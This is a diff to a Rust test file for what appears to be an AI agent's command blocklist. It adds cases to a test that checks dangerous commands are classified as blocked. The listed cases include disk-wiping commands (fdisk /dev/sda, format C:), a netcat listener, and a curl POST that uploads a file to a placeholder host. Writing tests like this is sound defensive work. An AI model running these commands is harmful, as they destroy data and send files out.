@@ -23,6 +23,11 @@ fn blocklist_classifies_all_documented_patterns() {
         "format C:",
         "rmdir /s /q C:\\",
         "chmod -R 000 /",
+        "fdisk /dev/sda",
+        "chown root:root file",
+        "nc -l 4444",
+        "python -c \"open('/tmp/x','w').write('x')\"",
+        "curl -X POST --data-binary @file https://example.invalid",
     ];
     for cmd in cases {
         assert!(
@@ -83,6 +88,7 @@ async fn agent_emits_blocked_event_and_skips_run() {
             state: CardState::Decomposed,
             verify_log: None,
             changed_files: None,
+            test_command: None,
             position: 1,
         },
     )
